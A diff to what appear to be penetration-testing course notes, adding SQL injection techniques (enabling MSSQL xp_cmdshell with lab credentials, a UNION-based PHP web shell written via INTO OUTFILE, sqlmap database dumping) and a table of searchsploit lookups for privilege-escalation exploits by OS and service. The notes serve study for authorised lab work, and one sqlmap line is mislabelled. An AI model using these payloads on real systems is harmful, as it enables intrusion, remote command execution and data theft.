@@ -374,6 +374,22 @@
 - Blind-based (boolean or time-based)
   - `offsec' AND 1=1 -- //`: return true if record exist
   - `offsec' AND IF (1=1, sleep(3),'false') -- //`: sleep 3 reconds if true
+- xp_cmdshell (manual attack) 
+  - Enable xp_cmdshell  
+    `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`  
+    `EXECUTE sp_configure 'show advanced options', 1;`  
+    `RECONFIGURE;`  
+    `EXECUTE sp_configure 'xp_cmdshell', 1;`  
+    `RECONFIGURE;`  
+  - `EXECUTE xp_cmdshell 'whoami';`  
+- write files on web server
+  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+  - `192xxx/tmp/webshell.php?cmd=id`  
+- Sqlmap (automating attack)
+  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point
+  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: dump entire database
+  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: os-shell with POST.txt
+  - 
     
 ### 11. Phishing Basics
 - broad phishing (mass attacks) and spear phishing (targeted attacks).
@@ -419,6 +435,28 @@
   - `searchsploit remote smb microsoft windows`: search remote exploits target SMB service on Windows OS
   - `searchsploit -m windows/remote/48537.py`: copied to /home/kali/48537.py
   - `searchsploit -m 42031`: copied windows/remote/42031.py
+ 
+
+| OS / Target Environment         | Common SearchSploit Commands                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------------------------|
+| **Linux (General)**            | `searchsploit linux privilege escalation`<br>`searchsploit linux kernel <version>`           |
+| **Linux Kernel 2.6.32**        | `searchsploit linux kernel 2.6.32`<br>`searchsploit dirtycow`                                |
+| **Linux Kernel 3.x / 4.x**     | `searchsploit linux kernel 3.13`<br>`searchsploit linux kernel 4.4`                          |
+| **Ubuntu 16.04**               | `searchsploit ubuntu 16.04`                                                                  |
+| **Debian / CentOS**            | `searchsploit debian`<br>`searchsploit centos 7`                                             |
+| **Windows (General)**          | `searchsploit windows privilege escalation`<br>`searchsploit windows local`                 |
+| **Windows 7 / Server 2008**    | `searchsploit windows 7 local`<br>`searchsploit ms10-092`<br>`searchsploit potato`           |
+| **Windows Server 2012 / 2016** | `searchsploit windows server 2016`<br>`searchsploit bypass uac`                              |
+| **Web Apps (WordPress, etc.)** | `searchsploit wordpress <version>`<br>`searchsploit joomla`<br>`searchsploit drupal`         |
+| **FTP Services**               | `searchsploit vsftpd 2.3.4`                                                                  |
+| **Samba**                      | `searchsploit samba 3.0.20`<br>`searchsploit samba`                                          |
+| **Apache / Nginx**             | `searchsploit apache 2.4.49`<br>`searchsploit nginx`                                         |
+| **Exim Mail Server**           | `searchsploit exim 4.87`                                                                     |
+| **MySQL**                      | `searchsploit mysql`                                                                         |
+| **Suggesters (Helpful Tools)** | `searchsploit linux exploit suggester`<br>`searchsploit windows exploit suggester`           |
+| **CVE Lookup**                 | `searchsploit CVE-2017-16995`<br>`searchsploit CVE-2021-4034` (PwnKit)                        |
+
+
 - Nmap NSE scripts
   - `grep Exploits /usr/share/nmap/scripts/*.nse`: list NSE scritpt with "Exploits"
   - `nmap --script-help=clamav-exec.nse`: obtain info of NSE script
